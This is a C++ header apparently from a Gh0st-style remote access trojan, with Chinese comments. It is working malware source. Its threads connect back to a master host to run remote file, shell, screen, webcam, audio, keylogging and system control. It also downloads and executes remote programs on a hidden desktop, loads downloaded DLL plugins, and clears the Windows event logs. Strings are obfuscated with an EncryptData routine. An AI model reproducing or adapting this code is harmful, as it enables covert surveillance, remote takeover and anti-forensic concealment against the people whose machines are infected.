#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED
#include "KernelManager.h"
#include "FileManager.h"
#include "ScreenManager.h"
#include "ShellManager.h"
#include "VideoManager.h"
#include "AudioManager.h"
#include "SystemManager.h"
#include "KeyboardManager.h"
#include "until.h"
#include "install.h"
#include <wininet.h>
#include <tchar.h>

extern bool g_bSignalHook;

DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
    CClientSocket	socketClient;
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;
    CFileManager	manager(&socketClient);
    socketClient.run_event_loop();

    return 0;
}

DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
{
    CClientSocket	socketClient;
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;

    CShellManager	manager(&socketClient);

    socketClient.run_event_loop();

    return 0;
}

DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
{
    CClientSocket	socketClient;
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;

    CScreenManager	manager(&socketClient);

    socketClient.run_event_loop();
    return 0;
}

// 摄像头不同一线程调用sendDIB的问题
DWORD WINAPI Loop_VideoManager(SOCKET sRemote)
{
    CClientSocket	socketClient;
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;
    CVideoManager	manager(&socketClient);
    socketClient.run_event_loop();
    return 0;
}


DWORD WINAPI Loop_AudioManager(SOCKET sRemote)
{
    CClientSocket	socketClient;
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;
    CAudioManager	manager(&socketClient);
    socketClient.run_event_loop();
    return 0;
}

DWORD WINAPI Loop_HookKeyboard(LPARAM lparam)
{
    TCHAR szModule[MAX_PATH - 1];
    TCHAR	strKeyboardOfflineRecord[MAX_PATH];
    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
    CKeyboardManager::MyGetSystemDirectory(strKeyboardOfflineRecord, ARRAYSIZE(strKeyboardOfflineRecord));
    lstrcat(strKeyboardOfflineRecord, TEXT("\\desktop.inf"));

    if (GetFileAttributes(strKeyboardOfflineRecord) != INVALID_FILE_ATTRIBUTES /*- 1*/)
    {
        int j = 1;
        g_bSignalHook = j;
    }
    else
    {
        //		CloseHandle(CreateFile( strKeyboardOfflineRecord, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL));
        //		g_bSignalHook = true;
        int i = 0;
        g_bSignalHook = i;
    }
    //		g_bSignalHook = false;

    while (1)
    {
        while (g_bSignalHook == 0)
        {
            Sleep(100);
        }
        CKeyboardManager::StartHook();
        while (g_bSignalHook == 1)
        {
            CKeyboardManager::MyGetShortPathName(szModule, szModule, MAX_PATH);
            Sleep(100);
        }
        CKeyboardManager::StopHook();
    }

    return 0;
}

DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
{
    CClientSocket	socketClient;
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;

    CKeyboardManager	manager(&socketClient);

    socketClient.run_event_loop();

    return 0;
}

DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
{
    CClientSocket	socketClient;
    if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
        return -1;

    CSystemManager	manager(&socketClient);

    socketClient.run_event_loop();

    return 0;
}

DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
    int	nUrlLength;
    TCHAR	*lpURL = NULL;
    TCHAR	*lpFileName = NULL;
    nUrlLength = lstrlen((TCHAR *)lparam);
    if (nUrlLength == 0)
        return false;

    lpURL = (TCHAR *)malloc((nUrlLength + 1) * sizeof(TCHAR));

    memcpy(lpURL, lparam, nUrlLength + 1);

    lpFileName = _tcsrchr(lpURL, TEXT('/')) + 1;
    if (lpFileName == NULL)
        return false;

    if (!http_get(lpURL, lpFileName))
    {
        return false;
    }

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi;
    si.cb = sizeof si;
    TCHAR str1[50] = TEXT("GQlKjY.B:UTYeRj");
    EncryptData((TCHAR *)&str1, lstrlen(str1), 12);
    si.lpDesktop = str1;
    CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

    return true;
}


//如果用urldowntofile的话，程序会卡死在这个函数上
bool UpdateServer(LPCTSTR lpURL)
{
    const TCHAR	*lpFileName = NULL;

    lpFileName = _tcsrchr(lpURL, TEXT('/')) + 1;
    if (lpFileName == NULL)
        return false;
    if (!http_get(lpURL, lpFileName))
        return false;

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi;
    si.cb = sizeof si;
    TCHAR str1[50] = TEXT("GQlKjY.B:UTYeRj");
    EncryptData((TCHAR *)&str1, lstrlen(str1), 12);
    si.lpDesktop = str1;
    return CreateProcess(lpFileName, TEXT("n1p5d4a1te"), NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}

bool OpenURL(LPCTSTR lpszURL, INT nShowCmd)
{
    if (_tcslen(lpszURL) == 0)
        return false;

    // System 权限下不能直接利用shellexecute来执行
    TCHAR	lpSubKey[50] = TEXT("9nnRQ[YjQolkBQUfnRohU,UfUBkVURRBonUlB[ommYlZ");
    EncryptData((TCHAR *)&lpSubKey, 0, 12);
    HKEY	hKey;
    TCHAR	strIEPath[MAX_PATH];
    LONG	nSize = sizeof(strIEPath);
    TCHAR	*lpstrCat = NULL;
    memset(strIEPath, 0, sizeof(strIEPath));

    if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
        return false;
    RegQueryValue(hKey, NULL, strIEPath, &nSize);
    RegCloseKey(hKey);

    if (CKeyboardManager::Mylstrlen(strIEPath) == 0)
        return false;

    lpstrCat = _tcsstr(strIEPath, TEXT("%1"));
    if (lpstrCat == NULL)
        return false;

    lstrcpy(lpstrCat, lpszURL);

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi;
    si.cb = sizeof si;
    TCHAR str1[50] = TEXT("GQlKjY.B:UTYeRj");
    EncryptData((TCHAR *)&str1, 0, 12);
    if (nShowCmd != SW_HIDE)
        si.lpDesktop = str1;

    CreateProcess(NULL, strIEPath, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

    return 0;
}

void CleanEvent()
{
    TCHAR str1[50] = TEXT("9nnRQ[YjQol");
    EncryptData((TCHAR *)&str1, lstrlen(str1), 12);
    TCHAR str2[50] = TEXT("KU[ehQja");
    EncryptData((TCHAR *)&str2, lstrlen(str2), 12);
    TCHAR str3[50] = TEXT("KakjUm");
    EncryptData((TCHAR *)&str3, lstrlen(str3), 12);
    TCHAR *strEventName[] = { str1, str2, str3 };

    for (int i = 0; i < sizeof(strEventName) / sizeof(int); i++)
    {
        HANDLE hHandle = OpenEventLog(NULL, strEventName[i]);
        if (hHandle == NULL)
            continue;
        ClearEventLog(hHandle, NULL);
        CloseEventLog(hHandle);
    }
}

void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
{
    TCHAR	strSubKey[1024];
    memset(strSubKey, 0, sizeof(strSubKey));
    TCHAR str1[50] = TEXT("KAKJ5MB;ehhUlj;oljhoRKUjBKUhdQ[UkB");
    EncryptData((TCHAR *)&str1, lstrlen(str1), 12);
    lstrcat(str1, TEXT("%s"));
    wsprintf(strSubKey, str1, lpServiceName);
    WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, TEXT("Host"), REG_SZ, (TCHAR *)lpHostID, lstrlen(lpHostID), 0);
}

DWORD WINAPI Loop_CHAJIAN(LPVOID lparam)
{
    TCHAR szModule[MAX_PATH];
    int	nLength = lstrlen((TCHAR*)lparam);
    CKeyboardManager::MyGetModuleFileName(NULL, szModule, MAX_PATH);
    TCHAR *Url = new TCHAR[nLength + 1];
    lstrcpy(Url, (TCHAR*)lparam);
    TCHAR TmpPath[MAX_PATH] = { 0 };
    TCHAR DllPath[MAX_PATH] = { 0 };
    CKeyboardManager::MyGetTempPath(ARRAYSIZE(TmpPath), TmpPath);

    //	wsprintf( DllPath, "%s\\fll_%03x.%03d", TmpPath, GetTickCount()%1000, GetTickCount()%1000 );
    //	CKeyboardManager::Mylstrcat( TmpPath, "\\fil_" );
    CKeyboardManager::Mylstrcat(TmpPath, CKeyboardManager::NumToStr(GetTickCount() + 5, 16));

    HMODULE hDll;
    if (http_get(Url, DllPath))
    {
        typedef	void(__stdcall *pPluginFunc)();
        hDll = LoadLibrary(DllPath);
        if (hDll == NULL) return -1;
        pPluginFunc PluginFunc = (pPluginFunc)CKeyboardManager::MyGetProcAddress(hDll, TEXT("PluginFunc"));
        if (PluginFunc)
            PluginFunc();//调用此函数
    }
    FreeLibrary(hDll);
    DeleteFile(DllPath);
    delete[] Url;

    return 0;
}

#endif // !defined(AFX_LOOP_H_INCLUDED)
